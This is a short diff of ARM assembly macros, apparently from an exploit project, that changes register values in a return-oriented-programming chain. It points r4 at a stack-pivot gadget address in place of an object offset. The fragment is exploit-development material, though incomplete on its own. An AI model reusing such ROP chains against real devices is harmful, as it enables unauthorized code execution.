@@ -33,7 +33,7 @@
 .word POP_R2R6PC
 .word 0 @ r2
 .word 0 @ r3
-.word ROPBUFLOC(object + 0x20) @ r4
+.word ROPBUFLOC(stackpivot_pcloadword) @ r4
 .word 0 @ r5
 .word 0 @ r6
 .endm
@@ -42,7 +42,7 @@
 .word POP_R2R6PC
 .word 0 @ r2
 .word 0 @ r3
-.word NEWTHREAD_ROPBUFFER + ((newthread_object + 0x20) - newthread_ropstart) @ r4
+.word NEWTHREAD_ROPBUFFER + ((newthread_rop_stackpivot_pcloadword) - newthread_ropstart) @ r4
 .word 0 @ r5
 .word 0 @ r6
 .endm
